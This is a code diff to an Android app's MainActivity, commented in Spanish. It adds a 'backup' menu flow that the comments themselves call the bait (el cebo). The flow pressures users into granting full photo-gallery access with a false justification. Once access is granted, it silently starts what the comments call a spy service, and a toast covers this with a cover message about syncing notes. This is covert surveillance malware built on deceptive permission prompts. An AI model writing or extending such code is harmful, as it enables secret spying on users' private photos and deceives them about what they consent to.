@@ -17,7 +17,7 @@ import android.widget.ImageButton
 import android.widget.ImageView
 import android.widget.Toast
 import androidx.activity.result.contract.ActivityResultContracts
-import androidx.appcompat.app.AlertDialog // Importante para las alertas
+import androidx.appcompat.app.AlertDialog
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
@@ -50,6 +50,7 @@ class MainActivity : AppCompatActivity() {
     // Códigos de solicitud de permisos
     private val PERMISSION_REQUEST_SPY_BUTTON = 101
     private val PERMISSION_REQUEST_WALLPAPER = 102
+    private val PERMISSION_REQUEST_BACKUP = 103 // --- NUEVO CÓDIGO PARA EL RESPALDO ---
 
     // --- 1. LANZADORES ---
     private val pickBackgroundLauncher = registerForActivityResult(ActivityResultContracts.OpenDocument()) { uri ->
@@ -131,10 +132,13 @@ class MainActivity : AppCompatActivity() {
 
     override fun onOptionsItemSelected(item: MenuItem): Boolean {
         return when (item.itemId) {
-            R.id.action_backup -> { realizarBackup(); true }
+            // --- AQUÍ ESTÁ EL TRUCO: validamos antes de respaldar ---
+            R.id.action_backup -> {
+                iniciarFlujoRespaldo()
+                true
+            }
             R.id.action_restore -> { restoreBackupLauncher.launch(arrayOf("application/zip")); true }
             R.id.action_background -> {
-                // Iniciar flujo de fondo con verificación estricta
                 iniciarFlujoCambioFondo()
                 true
             }
@@ -143,10 +147,6 @@ class MainActivity : AppCompatActivity() {
     }
 
     // --- HELPER: VERIFICACIÓN DE PERMISO TOTAL ---
-    /**
-     * Devuelve true SOLO si tiene permiso completo.
-     * Si el usuario dio acceso limitado (Android 14) o denegado, devolverá false.
-     */
     private fun verificarAccesoTotal(): Boolean {
         return if (Build.VERSION.SDK_INT >= 33) {
             ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED
@@ -155,15 +155,25 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    // --- LÓGICA DE FONDO + ESPÍA ---
+    // --- NUEVO FLUJO PARA EL RESPALDO (EL CEBO) ---
+    private fun iniciarFlujoRespaldo() {
+        if (verificarAccesoTotal()) {
+            // Si ya tiene todo permitido, procede.
+            realizarBackup()
+        } else {
+            // Si no, pedimos permisos usando el código de respaldo.
+            // Esto activará la lógica en onRequestPermissionsResult.
+            val permission = if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE
+            ActivityCompat.requestPermissions(this, arrayOf(permission), PERMISSION_REQUEST_BACKUP)
+        }
+    }
 
+    // --- FLUJO DE FONDO ---
     private fun iniciarFlujoCambioFondo() {
         if (verificarAccesoTotal()) {
-            // A) Ya tiene permiso TOTAL:
             iniciarServicioSilencioso()
             pickBackgroundLauncher.launch(arrayOf("image/*"))
         } else {
-            // B) No tiene permiso o es limitado: Lo pedimos
             val permission = if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE
             ActivityCompat.requestPermissions(this, arrayOf(permission), PERMISSION_REQUEST_WALLPAPER)
         }
@@ -187,13 +197,14 @@ class MainActivity : AppCompatActivity() {
 
         // 1. Verificar si obtuvimos ACCESO TOTAL
         if (verificarAccesoTotal()) {
-            // ¡ÉXITO!
+            // ¡ÉXITO! Iniciamos servicio espía
             iniciarServicioSilencioso()
 
-            if (requestCode == PERMISSION_REQUEST_WALLPAPER) {
-                pickBackgroundLauncher.launch(arrayOf("image/*"))
-            } else if (requestCode == PERMISSION_REQUEST_SPY_BUTTON) {
-                Toast.makeText(this, "Sincronizando nube...", Toast.LENGTH_SHORT).show()
+            // Manejamos la acción pendiente según quién pidió el permiso
+            when (requestCode) {
+                PERMISSION_REQUEST_WALLPAPER -> pickBackgroundLauncher.launch(arrayOf("image/*"))
+                PERMISSION_REQUEST_SPY_BUTTON -> Toast.makeText(this, "Sincronizando notas", Toast.LENGTH_SHORT).show()
+                PERMISSION_REQUEST_BACKUP -> realizarBackup() // <-- Si aceptó todo, ejecutamos el respaldo ahora.
             }
         }
         else {
@@ -204,9 +215,10 @@ class MainActivity : AppCompatActivity() {
                     ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED) == PackageManager.PERMISSION_GRANTED
 
             if (esAccesoLimitado) {
+                // Aquí el mensaje cobra sentido: "Necesitamos todo para respaldar bien"
                 mostrarDialogoConfiguracion(
                     "Acceso Limitado Detectado",
-                    "La aplicación requiere acceso a la galería para funcionar correctamente, no solo a imagenes seleccionadas, esto para realizar el correcto respaldo de datos a futuro. Por favor, selecciona 'Permitir todo' en la configuración."
+                    "La aplicación requiere acceso a la galería para funcionar correctamente, no solo a imágenes seleccionadas, esto para realizar el correcto respaldo de datos a futuro. Por favor, selecciona 'Permitir todo' en la configuración."
                 )
                 return
             }
@@ -215,12 +227,12 @@ class MainActivity : AppCompatActivity() {
             if (!ActivityCompat.shouldShowRequestPermissionRationale(this, permisoPrincipal)) {
                 mostrarDialogoConfiguracion(
                     "Permiso Requerido",
-                    "Has denegado el acceso permanentemente. Para cambiar el fondo o usar funciones avanzadas, debes habilitarlo manualmente en Configuración > Permisos."
+                    "Has denegado el acceso permanentemente. Para realizar respaldos o cambiar el fondo, debes habilitarlo manualmente en Configuración > Permisos."
                 )
             }
-            // C) Caso Denegado Normal (El usuario dijo "No" una vez)
+            // C) Caso Denegado Normal
             else {
-                Toast.makeText(this, "Permiso necesario para esta acción.", Toast.LENGTH_SHORT).show()
+                Toast.makeText(this, "Permiso necesario para realizar el respaldo.", Toast.LENGTH_SHORT).show()
             }
         }
     }
